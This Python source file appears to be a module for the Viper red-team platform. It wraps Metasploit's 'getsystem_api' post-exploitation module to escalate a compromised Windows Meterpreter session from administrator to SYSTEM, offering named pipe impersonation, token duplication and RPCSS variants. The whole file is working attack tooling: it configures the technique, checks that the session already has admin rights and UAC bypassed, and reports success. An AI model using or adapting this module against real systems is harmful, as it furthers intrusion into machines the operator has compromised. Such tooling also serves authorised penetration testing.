# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "Windows System提权"
    DESC_ZH = "模块尝试使用多种技术获取system权限,模块要求Session为绕过UAC的管理员权限"

    NAME_EN = "Windows system privilege escalation"
    DESC_EN = "The module tries to use a variety of techniques to obtain system permissions, and the module requires Session to be an administrator permission and bypassed UAC"

    REQUIRE_SESSION = True
    MODULETYPE = TAG2TYPE.Privilege_Escalation
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["Administrator"]  # 所需权限
    ATTCK = ["T1055"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/delftb"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1088/"]
    AUTHOR = ["Viper"]
    OPTIONS = register_options([
        OptionEnum(name='TECHNIQUE',
                   tag_zh="提权技术", desc_zh="选择提权技术,默认使用所有可利用方法",
                   tag_en="Privilege escalation technology",
                   desc_en="Select privilege escalation technology and use all available methods by default",
                   required=True,
                   default=0,
                   enum_list=[
                       {'tag_zh': '所有可用技术', 'tag_en': 'All techniques available', 'value': 0},
                       {'tag_zh': '管道仿冒技术(内存/管理员权限)', 'tag_en': 'Named Pipe Impersonation (In Memory/Admin)',
                        'value': 1},
                       {'tag_zh': '管道仿冒技术(加载器/管理员权限)', 'tag_en': 'Named Pipe Impersonation (Dropper/Admin)',
                        'value': 2},
                       {'tag_zh': 'Token复制', 'tag_en': 'Token Duplication (In Memory/Admin)', 'value': 3},
                       {'tag_zh': '管道仿冒技术(RPCSS变量)', 'tag_en': 'Named Pipe Impersonation (RPCSS variant)', 'value': 4},
                   ]),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "windows/escalate/getsystem_api"

    def check(self):
        """执行前的检查函数"""

        session = Session(self._sessionid)
        if not session.is_windows:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"
        if session.is_admin is True:
            self.set_msf_option('TECHNIQUE', self.param('TECHNIQUE'))
            return True, None
        else:
            return False, "模块需要管理员权限,请尝试使用UAC绕过模块", "The module requires administrator rights, please try to use UAC bypass module"

    def callback(self, status, message, data):
        if status is not True:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
            return
        else:
            self.log_info("模块执行完成", "Module operation completed")
            self.log_good("Session已获取System权限", "Session has obtained System permissions")
            return
